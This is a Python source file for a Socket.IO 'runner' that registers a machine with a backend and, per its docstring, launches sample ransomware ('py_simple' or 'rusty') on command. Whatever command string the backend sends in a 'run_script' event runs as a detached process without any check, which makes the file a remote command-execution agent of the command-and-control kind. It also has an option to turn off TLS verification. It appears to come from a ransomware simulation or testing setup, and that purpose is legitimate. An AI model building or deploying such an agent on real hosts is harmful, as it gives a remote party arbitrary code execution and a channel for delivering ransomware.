"""
Minimal Socket.IO runner that connects to the backend and waits for UI commands
to execute sample ransomware (py_simple or rusty). It does not encrypt by itself;
it only spawns the selected sample on demand.
"""
from __future__ import annotations

import os, sys, time, platform, subprocess, socket
import argparse
import requests
import socketio


def _spawn_detached(argv: list[str], extra_env: dict[str, str] | None = None) -> int:
    env = os.environ.copy()
    if extra_env:
        env.update(extra_env)
    popen_kwargs: dict = { 'shell': False, 'env': env }
    if platform.system() == 'Windows':
        CREATE_NEW_PROCESS_GROUP = 0x00000200
        DETACHED_PROCESS = 0x00000008
        popen_kwargs['creationflags'] = CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS
    else:
        popen_kwargs['start_new_session'] = True
    proc = subprocess.Popen(argv, **popen_kwargs)
    return proc.pid


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--backend', default=os.getenv('BACKEND_URL'))
    parser.add_argument('--hostname', default=socket.gethostname())
    parser.add_argument('--insecure', action='store_true')
    parser.add_argument('--debug', action='store_true')
    parser.add_argument('--polling', action='store_true')
    args = parser.parse_args()
    if not args.backend:
        raise SystemExit('Provide --backend or set BACKEND_URL')
    backend = args.backend.rstrip('/')

    session = requests.Session()
    session.verify = not args.insecure
    # Register to get a token so UI can list this device
    try:
        r = session.post(f"{backend}/publickey", json={'hostname': args.hostname}, timeout=20)
        r.raise_for_status()
        data = r.json()
        device_token = data.get('device_token')
        ws_url = data.get('ws_url') or backend
    except Exception as e:
        raise SystemExit(f"register failed: {e}")

    sio = socketio.Client(http_session=session, logger=args.debug, engineio_logger=args.debug)

    @sio.event
    def connect():
        print('[runner] Connected, authenticating…')
        sio.emit('authenticate', {'device_token': device_token})

    @sio.on('auth_ok')
    def on_auth_ok(_msg):
        print('[runner] Authenticated; idle and waiting for UI selection')
        try:
            sio.emit('device_hello', {'device_token': device_token, 'hostname': args.hostname})
        except Exception:
            pass

    @sio.on('run_script')
    def on_run_script(msg=None):
        try:
            cmd = (msg or {}).get('command') or ''
            if not cmd:
                return
            # Build argv robustly for Windows
            import shlex
            try:
                argv = shlex.split(cmd, posix=False)
            except Exception:
                argv = [cmd]
            # Replace python with current interpreter if present
            if argv:
                first = argv[0].strip('"').lower()
                if first in ('python', 'python.exe') or first.endswith('\\python.exe'):
                    argv[0] = sys.executable
            # Ensure child inherits backend/report env
            extra_env = {'BACKEND_URL': backend, 'REPORT_DIR': os.getenv('REPORT_DIR') or r'C:\\Users\\user\\report'}
            pid = _spawn_detached(argv, extra_env)
            print(f"[runner] Launched: {' '.join(argv)} pid={pid}")
            try:
                sio.emit('script_output', {
                    'device_token': device_token,
                    'command': ' '.join(argv),
                    'pid': pid,
                    'started': True,
                    'returncode': None,
                    'stdout': '',
                    'stderr': '',
                    'ts': int(time.time()),
                })
            except Exception:
                pass
        except Exception as e:
            print(f"[runner] run_script failed: {e}")

    # Connect using preferred transports
    transports = ['polling'] if args.polling else ['websocket', 'polling']
    try:
        sio.connect(ws_url, transports=transports, wait_timeout=30, socketio_path='socket.io')
        sio.wait()
    except KeyboardInterrupt:
        pass


if __name__ == '__main__':
    main()
